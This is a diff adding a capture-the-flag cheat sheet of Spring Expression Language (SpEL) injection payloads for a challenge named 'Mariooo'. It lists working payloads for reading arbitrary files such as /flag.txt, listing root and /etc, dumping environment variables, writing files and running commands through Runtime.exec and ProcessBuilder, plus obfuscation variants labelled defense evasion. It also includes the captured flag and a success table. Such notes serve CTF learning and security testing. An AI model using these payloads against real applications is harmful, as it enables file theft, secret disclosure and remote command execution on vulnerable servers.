@@ -1,0 +1,200 @@
+# Mariooo Challenge - SpEL Injection Payloads
+
+## Vulnerability Testing Payloads
+
+### Basic Expression Evaluation
+```
+${{7*7}}
+```
+Expected: 49
+Purpose: Confirm expression evaluation is enabled
+
+### Java Class Access Test
+```
+${T(java.lang.Math).sqrt(81)}
+```
+Expected: 9
+Purpose: Confirm Java Expression Language (SpEL) is being used
+
+### Java Runtime Information
+```
+${T(java.lang.System).getProperty('java.version')}
+```
+Purpose: Get Java version
+
+```
+${T(java.lang.System).getProperty('user.dir')}
+```
+Purpose: Get current working directory
+
+```
+${T(java.lang.System).getProperty('os.name')}
+```
+Purpose: Get operating system name
+
+---
+
+## File Reading Payloads
+
+### Method 1: Byte Array (First Attempt)
+```
+${T(java.util.Arrays).toString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
+```
+Result: Returns byte array like `[80, 67, 67, ...]`
+Note: Requires manual conversion to string
+
+### Method 2: Direct String Conversion (WINNER)
+```
+${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
+```
+Result: Returns flag as readable text - `PCC{m4ri0_i5_cr4zy_hmmm_nEcSO5wQsf2y}`
+Note: Best method for this challenge
+
+### Method 3: Base64 Encoding (Alternative)
+```
+${T(java.util.Base64).getEncoder().encodeToString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
+```
+Result: Returns Base64-encoded flag
+Note: Useful if output has encoding issues
+
+Decode locally:
+```bash
+echo "<base64_output>" | base64 -d
+```
+
+### Method 4: File Listing
+```
+${T(java.nio.file.Files).list(T(java.nio.file.Paths).get('/')).toArray()}
+```
+Purpose: List files in root directory
+
+```
+${T(java.nio.file.Files).list(T(java.nio.file.Paths).get('/etc')).toArray()}
+```
+Purpose: List files in /etc directory
+
+---
+
+## Command Execution Payloads (If Applicable)
+
+### Using Runtime.exec()
+```
+${T(java.lang.Runtime).getRuntime().exec('cat /flag.txt')}
+```
+Note: Returns Process object, not output
+
+### Using ProcessBuilder
+```
+${T(java.lang.ProcessBuilder).new({'cat','/flag.txt'}).start()}
+```
+Note: More complex, requires output stream handling
+
+---
+
+## Environment Variable Payloads
+
+### Get All Environment Variables
+```
+${T(java.lang.System).getenv()}
+```
+
+### Get Specific Environment Variable
+```
+${T(java.lang.System).getenv('PATH')}
+```
+
+```
+${T(java.lang.System).getenv('HOME')}
+```
+
+---
+
+## Advanced Exploitation Payloads
+
+### ClassLoader Access
+```
+${T(java.lang.Thread).currentThread().getContextClassLoader()}
+```
+
+### Access to Application Context (Spring)
+```
+${applicationScope}
+```
+
+```
+${@systemProperties}
+```
+
+### Create Files (Caution: Destructive)
+```
+${T(java.nio.file.Files).write(T(java.nio.file.Paths).get('/tmp/test.txt'), 'test content'.getBytes())}
+```
+
+---
+
+## Payload Variations and Bypasses
+
+### Alternative Syntax for Class Access
+```
+${''.getClass().forName('java.lang.Math').sqrt(81)}
+```
+
+### Nested Expressions
+```
+${${7*7}}
+```
+
+### String Concatenation
+```
+${'Hel' + 'lo'}
+```
+
+---
+
+## Defense Evasion Techniques
+
+### Obfuscation with String Concatenation
+```
+${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/fl'+'ag.txt')))}
+```
+
+### Using Unicode Escapes
+```
+${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/\u0066lag.txt')))}
+```
+
+---
+
+## Quick Reference Card
+
+| Goal | Payload |
+|------|---------|
+| Test vulnerability | `${{7*7}}` |
+| Confirm SpEL | `${T(java.lang.Math).sqrt(81)}` |
+| Read flag (best) | `${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}` |
+| Read flag (Base64) | `${T(java.util.Base64).getEncoder().encodeToString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}` |
+| Get Java version | `${T(java.lang.System).getProperty('java.version')}` |
+| List directory | `${T(java.nio.file.Files).list(T(java.nio.file.Paths).get('/')).toArray()}` |
+
+---
+
+## Notes
+
+- All payloads tested on Mariooo challenge
+- The direct string conversion method was most reliable
+- Some payloads may require output stream handling for complex operations
+- Always test basic payloads first before trying complex exploitation
+- Be aware of character limits in input fields
+
+---
+
+## Success Rate
+
+| Method | Success | Notes |
+|--------|---------|-------|
+| Math test | ✓ | Confirms vulnerability |
+| Java class access | ✓ | Confirms SpEL |
+| Byte array read | ✓ | Works but needs conversion |
+| **String read** | **✓** | **Best method - direct flag** |
+| Base64 read | ✓ | Alternative if encoding issues |
+| Command execution | ✗ | Not needed for this challenge |
